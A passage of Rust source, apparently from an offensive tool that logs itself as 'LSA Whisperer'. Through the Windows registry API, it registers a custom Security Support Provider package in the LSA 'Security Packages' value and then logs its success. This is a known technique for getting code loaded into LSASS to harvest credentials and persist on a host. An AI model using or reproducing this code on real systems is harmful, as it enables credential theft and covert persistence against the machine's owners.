            0,
            winapi::um::winnt::REG_MULTI_SZ,
            new_bytes.as_ptr(),
            new_bytes.len() as u32,
        )
    };

    unsafe { winapi::um::winreg::RegCloseKey(hkey); }

    if err as u32 != winapi::shared::winerror::ERROR_SUCCESS {
        return Err(anyhow!(
            "RegSetValueExW(Security Packages) failed: win32 error {err:#x}"
        ));
    }

    log::info!(
        "LSA Whisperer: registered SSP package '{SSP_PACKAGE_NAME}' in LSA Security Packages"
    );

    Ok(())
}
